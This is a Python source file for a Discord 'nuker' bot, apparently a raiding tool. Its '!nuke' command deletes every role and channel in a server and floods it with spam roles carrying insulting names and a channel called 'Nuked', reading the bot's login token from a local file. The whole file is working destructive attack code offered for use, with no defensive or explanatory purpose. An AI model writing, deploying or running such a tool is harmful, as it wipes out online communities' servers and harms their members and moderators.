from fileinput import close
import discord
from discord.ext import commands
import colorama
import random
from colorama import Fore
from colorama import Style
import Start
colorama.init()

client = discord.Client() 
client = discord.Client()
client = commands.Bot(command_prefix="!")
random_role = ("StarX", "StarX.Spamed", "StarX.raider", "starX", "StarX geño", "StarXed", "StarS on StarX", "Nuked Bitch")

repeats = 20
@client.command()
async def nuke(ctx):
        print('Logged in as:\n{0.user.name}\n{0.user.id}'.format(client))
        await ctx.message.delete()
        guild = ctx.guild
        for role in guild.roles:
            try:
                await role.delete()
                print(Fore.MAGENTA + f"{role.name} was deleted." + Fore.RESET)
            except:
                print(Fore.GREEN + f"{role.name} was NOT deleted." + Fore.RESET)
        for channel in guild.channels:
            try:
                await channel.delete()
                print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
                print(Fore.MAGENTA + f"Nuked channel was created" + Fore.RESET)
            except:
                print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
        for i in range(0,repeats):
            await guild.create_role(name= random.choice(random_role))
            print(Fore.MAGENTA + f"{role.name} was created." + Fore.RESET)
        await guild.create_text_channel('Nuked')
        print('')
        return Start.welcome()
        

f = open("token.txt", "r")
token = f.read()
client.run(token)